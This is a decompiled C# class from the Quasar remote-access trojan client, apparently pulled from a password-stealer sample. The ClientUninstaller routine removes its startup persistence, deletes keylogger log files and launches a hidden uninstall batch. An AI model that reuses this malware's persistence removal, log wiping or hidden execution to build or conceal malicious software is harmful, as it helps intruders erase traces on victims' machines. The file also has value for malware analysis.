// Decompiled with JetBrains decompiler
// Type: Quasar.Client.Setup.ClientUninstaller
// Assembly: Client, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C3C7FC-0EA2-48C4-8CEF-33A8CFDA287C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Agent.anew-0b84e664c8b592aa0220d52841629b2accb41f1f624720331000ab5f2f0ed628.exe

using Quasar.Client.Config;
using Quasar.Client.IO;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace Quasar.Client.Setup
{
  public class ClientUninstaller : ClientSetupBase
  {
    public void Uninstall()
    {
      if (Settings.STARTUP)
        new ClientStartup().RemoveFromStartup(Settings.STARTUPKEY);
      if (Settings.ENABLELOGGER && Directory.Exists(Settings.LOGSPATH))
      {
        Regex reg = new Regex("^\\d{4}\\-(0[1-9]|1[012])\\-(0[1-9]|[12][0-9]|3[01])$");
        foreach (string path in ((IEnumerable<string>) Directory.GetFiles(Settings.LOGSPATH, "*", SearchOption.TopDirectoryOnly)).Where<string>((Func<string, bool>) (path => reg.IsMatch(Path.GetFileName(path)))).ToList<string>())
        {
          try
          {
            File.Delete(path);
          }
          catch (Exception ex)
          {
          }
        }
      }
      string uninstallBatch = BatchFile.CreateUninstallBatch(Application.ExecutablePath);
      Process.Start(new ProcessStartInfo()
      {
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        FileName = uninstallBatch
      });
    }
  }
}
